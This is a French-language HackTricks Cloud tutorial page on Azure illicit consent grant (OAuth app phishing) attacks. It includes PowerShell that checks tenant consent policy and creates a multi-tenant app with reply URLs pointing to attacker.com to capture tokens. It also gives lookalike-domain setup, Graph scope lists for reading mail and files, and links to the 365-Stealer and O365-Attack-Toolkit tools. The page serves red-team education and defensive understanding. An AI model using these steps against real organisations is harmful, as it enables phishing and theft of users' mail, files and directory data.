# Az - Attribution de consentement illicite

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-moi** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Hame√ßonnage d'application OAuth

Les **Applications Azure** demandent des permissions pour acc√©der aux **donn√©es utilisateur** (informations de base, mais aussi acc√®s aux documents, envoi d'emails...).\
Si **autoris√©**, un utilisateur normal peut donner son consentement uniquement pour des permissions de **"Faible Impact"**. Dans **tous les autres** cas, **le consentement d'un administrateur est requis**.\
`GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` et un r√¥le personnalis√© incluant la `permission de donner des permissions aux applications` peuvent fournir un consentement √† l'√©chelle du locataire.

Seules les permissions qui **ne n√©cessitent pas le consentement de l'administrateur** sont class√©es comme de **faible impact**. Ce sont les permissions requises pour une **connexion de base sont openid, profile, email, User.Read et offline_access**. Si une **organisation** **autorise** le consentement de l'utilisateur pour **toutes les applications**, un employ√© peut donner son consentement √† une application pour **lire ce qui pr√©c√®de de son profil**.

<figure><img src="../../../.gitbook/assets/image (3) (2) (1).png" alt=""><figcaption></figcaption></figure>

Par cons√©quent, un attaquant pourrait pr√©parer une **Application malveillante** et, avec un **hame√ßonnage**, amener l'utilisateur √† **accepter l'Application et voler ses donn√©es**.

### V√©rifier si les utilisateurs sont autoris√©s √† donner leur consentement

V√©rifiez si les utilisateurs sont autoris√©s √† donner leur consentement aux applications :

{% code overflow="wrap" %}
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
{% endcode %}

* **D√©sactiver le consentement utilisateur** : Les utilisateurs ne peuvent pas accorder de permissions aux applications.
* **Les utilisateurs peuvent consentir aux applications des √©diteurs v√©rifi√©s ou de votre organisation, mais seulement pour les permissions que vous s√©lectionnez** : Tous les utilisateurs peuvent uniquement consentir aux applications qui ont √©t√© publi√©es par un √©diteur v√©rifi√© et aux applications qui sont enregistr√©es dans votre locataire
* **Les utilisateurs peuvent consentir √† toutes les applications** : permet √† tous les utilisateurs de consentir √† n'importe quelle permission qui ne n√©cessite pas le consentement de l'administrateur,
* **Politique de consentement d'application personnalis√©e**

## **Qu'est-ce qu'une attaque par consentement illicite ?**

Dans une attaque par consentement illicite, l'attaquant cr√©e une **application enregistr√©e sur Azure qui demande l'acc√®s √† des donn√©es telles que les informations de contact, les e-mails ou les documents**. L'attaquant trompe ensuite un utilisateur final pour qu'il donne son consentement √† l'application afin que l'attaquant puisse acc√©der aux donn√©es auxquelles l'utilisateur cible a acc√®s. Une fois que l'application a re√ßu le consentement, elle a acc√®s aux donn√©es au niveau du compte utilisateur sans n√©cessiter de compte organisationnel.

En termes simples, lorsque la victime clique sur ce beau bouton bleu "Accepter", Azure AD envoie un jeton au site tiers qui appartient √† un attaquant o√π l'attaquant utilisera le jeton pour effectuer des actions au nom des victimes comme acc√©der √† tous les fichiers, lire les e-mails, envoyer des e-mails, etc.

## **D√©roulement de l'attaque**

<figure><img src="../../../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>

Pour r√©aliser cette attaque contre l'entreprise "ecorp", l'attaquant pourrait enregistrer un domaine avec le nom "safedomainlogin.com" et cr√©er un sous-domaine ["ecorp.safedomainlogin.com"](http://ecorp.safedomainlogin.com/) o√π ils **h√©bergent l'application pour capturer le code d'autorisation** et ensuite demander les jetons d'acc√®s.

Ensuite, enregistrer une Application Multi-Tenant dans leur locataire Azure AD et la nommer "ecorp" et ajouter l'URL de redirection qui pointe vers "ecorp.safedomainlogin.com" qui h√©berge une application pour capturer le code d'autorisation.

L'attaquant cr√©e √©galement un nouveau secret client et ajoute quelques **permissions** d'API telles que `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read` dans l'application. Ainsi, une fois que **l'utilisateur donne son consentement √† l'application**, l'attaquant peut **extraire** les **informations sensibles** au nom de l'utilisateur.

L'attaquant cr√©e finalement le **lien** qui contenait l'identifiant client de l'application malveillante et **partage** le lien avec les **utilisateurs cibl√©s** pour obtenir leur consentement.

## 365-Stealer

Vous pouvez r√©aliser cette attaque avec [**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer).

Comme √©tape suppl√©mentaire, si vous avez un certain **acc√®s sur un utilisateur dans l'organisation victime**, vous pouvez v√©rifier si la politique lui permettra d'**accepter les applications** :
```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("test@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# If "ManagePermissionGrantsForSelf.microsoft-user-default-legacy", he can
```
Pour cette attaque, vous devrez cr√©er une **nouvelle application dans votre locataire Azure** (dans les inscriptions d'applications) avec, par exemple, les permissions suivantes :

<figure><img src="../../../.gitbook/assets/image (2) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

`User.ReadBasic.All` se trouve dans `Microsoft Graph` dans `Permissions d√©l√©gu√©es`. (Les permissions d'application n√©cessiteront toujours une approbation suppl√©mentaire).

* `User.ReadBasic.All` est la permission qui vous permettra de **lire les informations de tous les utilisateurs** de l'organisation si elle est accord√©e.
* Rappelez-vous que seuls `GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` et un r√¥le personnalis√© incluant la `permission d'accorder des permissions aux applications` peuvent fournir un consentement √† l'√©chelle du locataire. Ainsi, vous devriez **hame√ßonner un utilisateur avec l'un de ces r√¥les** si vous voulez qu'il approuve une **application n√©cessitant le consentement de l'administrateur**.

Vous pourriez √©galement cr√©er une application via la ligne de commande avec :

{% code overflow="wrap" %}
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
$AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)

$app.RequiredResourceAccess.Add($AADAccess)
} else {
$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
```markdown
{% endcode %}

Consultez [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer) pour apprendre √† le configurer.

{% hint style="warning" %}
Notez que le **jeton d'acc√®s** obtenu sera pour le **point de terminaison graph** avec les port√©es : `User.Read` et `User.ReadBasic.All` (les permissions demand√©es). Vous ne pourrez pas effectuer d'autres actions (mais celles-ci suffisent pour **t√©l√©charger des informations sur tous les utilisateurs** dans l'organisation).
{% endhint %}

## [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)

Vous pouvez √©galement utiliser cet outil pour r√©aliser cette attaque.

## Post-Exploitation

Une fois que vous avez acc√®s √† l'utilisateur, vous pouvez faire des choses telles que voler des documents sensibles et m√™me t√©l√©verser des fichiers de documents avec porte d√©rob√©e.

## R√©f√©rences

* Ce post a √©t√© copi√© de [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
```
